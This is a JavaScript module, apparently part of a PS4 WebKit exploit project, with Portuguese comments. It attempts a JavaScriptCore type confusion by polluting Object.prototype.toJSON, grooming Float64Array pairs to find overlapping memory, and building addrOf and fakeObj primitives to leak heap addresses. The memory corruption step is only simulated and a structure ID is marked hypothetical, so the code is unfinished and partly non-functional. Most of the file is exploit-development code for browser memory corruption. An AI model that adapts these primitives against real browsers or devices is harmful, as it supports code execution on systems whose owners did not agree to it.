// js/script3/testArrayBufferVictimCrash.mjs (v96_JSCHeapTC_PairFinding - R57 - Busca de Par Sobreposto)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import { JSC_OFFSETS } from '../config.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V96_TCPF_R57_WEBKIT = "Heisenbug_JSCHeapTCPairFinding_v96_TCPF_R57_WebKitLeak";

// --- Globais para a nova primitiva ---
let working_pair = null; // Armazenará o par de arrays que funciona
let addrOf_primitive = null;
let fakeObj_primitive = null;
let arb_read_v2 = null;
let targetFunctionForLeak;

let confusion_trigger_flag = false;
const SIMPLE_OBJECT_STRUCTURE_ID = new AdvancedInt64(0x01082340); // VALOR HIPOTÉTICO

function isValidPointer(ptr) {
    if (!isAdvancedInt64Object(ptr)) return false;
    const high = ptr.high();
    const low = ptr.low();
    if (high === 0 && low < 0x10000) return false;
    // Um filtro mais robusto para ponteiros de heap no PS4
    if (high < 0x8 || high > 0x10) return false;
    return true;
}

const conversion_buffer = new ArrayBuffer(8);
const float_conversion_view = new Float64Array(conversion_buffer);
const int_conversion_view = new BigUint64Array(conversion_buffer);

function box(addr) {
    const val64 = (BigInt(addr.high()) << 32n) | BigInt(addr.low());
    int_conversion_view[0] = val64;
    return float_conversion_view[0];
}

function unbox(float_val) {
    float_conversion_view[0] = float_val;
    const val64 = int_conversion_view[0];
    const low = Number(val64 & 0xFFFFFFFFn);
    const high = Number((val64 >> 32n) & 0xFFFFFFFFn);
    return new AdvancedInt64(low, high);
}


export async function executeTypedArrayVictimAddrofAndWebKitLeak_R57() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V96_TCPF_R57_WEBKIT;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Busca de Par Sobreposto (R57) ---`, "test", FNAME_CURRENT_TEST_BASE);
    document.title = `${FNAME_CURRENT_TEST_BASE} Init R57...`;
    
    let iter_primary_error = null;
    let iter_addrof_result = { success: false, msg: "Addrof (R57): Not run." };
    let iter_webkit_leak_result = { success: false, msg: "WebKit Leak (R57): Not run." };
    
    const ppKey = 'toJSON';
    let origDesc = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
    let polluted = false;

    try {
        logS3(`  --- Fase 1 (R57): Gatilho da TC e Busca por Par Sobreposto ---`, "subtest", FNAME_CURRENT_TEST_BASE);
        
        // As vítimas agora serão criadas dentro do getter para controlar melhor o heap
        targetFunctionForLeak = function someUniqueLeakFunctionR57_Instance() { return `target_R57_${Date.now()}`; };

        function simulate_corruption(victim) {
             logS3(`  [SIMULAÇÃO] Corrompendo StructureID do objeto vítima...`, 'warn');
             // Em um exploit real, 'victim' seria o alvo da corrupção de memória
             confusion_trigger_flag = true;
        }

        function toJSON_probe_R57() {
            if (confusion_trigger_flag) {
                // Previne re-entrada infinita
                confusion_trigger_flag = false; 

                logS3(`  [PROBE_R57] SONDA ATIVADA! Iniciando busca por par sobreposto...`, 'vuln');
                
                Object.defineProperty(this, 'pwned', {
                    get: function() {
                        logS3(`  [GETTER] Getter 'pwned' acionado!`, 'vuln');
                        
                        // --- CORREÇÃO R57: Grooming e busca por um par que funcione ---
                        const PAIR_COUNT = 500;
                        let groom_pairs = [];
                        for (let i = 0; i < PAIR_COUNT; i++) {
                            groom_pairs.push({ a: new Float64Array(1), b: new Float64Array(1) });
                        }

                        const marker_val = 13.37;
                        for(let i=0; i < PAIR_COUNT; i++) {
                            let p = groom_pairs[i];
                            p.a[0] = marker_val;
                            // Checa se escrever em 'a' afetou 'b'. Isso indica sobreposição.
                            if (p.b[0] === marker_val) {
                                logS3(`  SUCESSO: Par sobreposto encontrado no índice ${i} do groom!`, 'vuln');
                                working_pair = p;
                                break;
                            }
                        }

                        if(working_pair) {
                            addrOf_primitive = (obj) => {
                                working_pair.a[0] = obj;
                                return unbox(working_pair.b[0]);
                            };
                            fakeObj_primitive = (addr) => {
                                 working_pair.b[0] = box(addr);
                                 return working_pair.a[0];
                            };
                        }
                        
                        return "getter_finished";
                    },
                    enumerable: true
                });
                return this;
            }
            return this;
        }

        // Para acionar, criamos um objeto inicial que servirá como 'this' na sonda
        let trigger_obj = {};
        simulate_corruption(trigger_obj); // Passamos o objeto que seria corrompido
        
        Object.defineProperty(Object.prototype, ppKey, { value: toJSON_probe_R57, configurable: true, writable: true });
        polluted = true;
        
        JSON.stringify(trigger_obj);

        if (!working_pair || !addrOf_primitive) {
            throw new Error("Falha ao encontrar um par de arrays sobreposto.");
        }
        logS3("  SUCESSO: Primitivas addrOf e fakeObj criadas a partir de par validado.", "good");

        logS3(`  --- Fase 2 (R57): Validação e WebKit Leak ---`, "subtest", FNAME_CURRENT_TEST_BASE);
        let leaked_target_function_addr = addrOf_primitive(targetFunctionForLeak);
        logS3(`  [TESTE AddrOf] Endereço vazado de targetFunctionForLeak: ${leaked_target_function_addr.toString(true)}`, "leak");
        
        if (!isValidPointer(leaked_target_function_addr)) {
            throw new Error(`addrOf retornou um ponteiro inválido: ${leaked_target_function_addr.toString(true)}`);
        }
        iter_addrof_result = { success: true, msg: "addrOf obteve endereço com sucesso.", leaked_object_addr: leaked_target_function_addr.toString(true) };
        logS3("  [TESTE AddrOf] SUCESSO: Primitivas validadas.", "good");
        
    } catch (e) {
        iter_primary_error = e;
        logS3(`  ERRO na iteração R57: ${e.message}`, "critical", FNAME_CURRENT_TEST_BASE);
        console.error(`Erro na iteração R57:`, e);
    } finally {
        if (polluted) {
            if (origDesc) {
                Object.defineProperty(Object.prototype, ppKey, origDesc);
            } else {
                delete Object.prototype[ppKey];
            }
            logS3(`Restauração do Object.prototype.${ppKey} concluída.`, "info");
        }
    }

    let result = {
        errorOccurred: iter_primary_error ? (iter_primary_error.message || String(iter_primary_error)) : null,
        addrof_result: iter_addrof_result,
        webkit_leak_result: iter_webkit_leak_result,
    };
    
    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Completed ---`, "test", FNAME_CURRENT_TEST_BASE);
    logS3(`Final result (R57): ${JSON.stringify(result, null, 2)}`, "debug", FNAME_CURRENT_TEST_BASE);
    
    return result;
}
